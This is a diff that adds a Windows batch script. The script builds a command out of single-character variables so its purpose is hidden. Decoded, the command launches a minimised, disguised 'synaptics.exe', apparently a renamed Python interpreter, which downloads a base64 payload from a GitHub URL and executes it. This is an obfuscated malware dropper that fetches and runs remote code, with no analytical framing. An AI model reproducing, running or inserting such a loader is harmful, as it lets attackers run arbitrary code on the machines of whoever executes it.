@@ -1,0 +1,45 @@
+ÿþ
+@echo off
+set UA=P
+set KQ=)
+set ZQ=e
+set eA=x
+set bg=n
+set XA=\
+set IA= 
+set Og=:
+set VQ=U
+set KA=(
+set cA=p
+set LQ=-
+set ZA=d
+set Jw='
+set Zg=f
+set Ow=;
+set cg=r
+set bw=o
+set Ng=6
+set bQ=m
+set eQ=y
+set Ig="
+set Yw=c
+set RA=D
+set cQ=q
+set dQ=u
+set NA=4
+set YQ=a
+set aQ=i
+set Lw=/
+set aA=h
+set cw=s
+set dA=t
+set Yg=b
+set Lg=.
+set dw=w
+setlocal EnableDelayedExpansion
+set OA=8
+set bA=l
+set Qw=C
+set Zw=g
+cls
+%cw%%dA%%YQ%%cg%%dA%%IA%%Ig%%Ig%%IA%%Lw%%bQ%%aQ%%bg%%IA%%Ig%%Qw%%Og%%XA%%XA%%VQ%%cw%%ZQ%%cg%%cw%%XA%%XA%%UA%%dQ%%Yg%%bA%%aQ%%Yw%%XA%%XA%%RA%%bw%%Yw%%dQ%%bQ%%ZQ%%bg%%dA%%XA%%XA%%cw%%eQ%%bg%%YQ%%cA%%dA%%aQ%%Yw%%cw%%Lg%%ZQ%%eA%%ZQ%%Ig%%IA%%LQ%%Yw%%IA%%Ig%%aQ%%bQ%%cA%%bw%%cg%%dA%%IA%%dQ%%cg%%bA%%bA%%aQ%%Yg%%Lg%%cg%%ZQ%%cQ%%dQ%%ZQ%%cw%%dA%%Ow%%aQ%%bQ%%cA%%bw%%cg%%dA%%IA%%Yg%%YQ%%cw%%ZQ%%Ng%%NA%%Ow%%ZQ%%eA%%ZQ%%Yw%%KA%%Yg%%YQ%%cw%%ZQ%%Ng%%NA%%Lg%%Yg%%Ng%%NA%%ZA%%ZQ%%Yw%%bw%%ZA%%ZQ%%KA%%dQ%%cg%%bA%%bA%%aQ%%Yg%%Lg%%cg%%ZQ%%cQ%%dQ%%ZQ%%cw%%dA%%Lg%%dQ%%cg%%bA%%bw%%cA%%ZQ%%bg%%KA%%Jw%%aA%%dA%%dA%%cA%%cw%%Og%%Lw%%Lw%%cg%%YQ%%dw%%Lg%%Zw%%aQ%%dA%%aA%%dQ%%Yg%%dQ%%cw%%ZQ%%cg%%Yw%%bw%%bg%%dA%%ZQ%%bg%%dA%%Lg%%Yw%%bw%%bQ%%Lw%%bw%%Yw%%Yw%%LQ%%bQ%%Lw%%Zw%%bw%%Yw%%Lw%%bQ%%YQ%%aQ%%bg%%Lw%%Yg%%cw%%Jw%%KQ%%Lg%%cg%%ZQ%%YQ%%ZA%%KA%%KQ%%Lg%%ZA%%ZQ%%Yw%%bw%%ZA%%ZQ%%KA%%Jw%%dQ%%dA%%Zg%%LQ%%OA%%Jw%%KQ%%KQ%%KQ%%Ig%
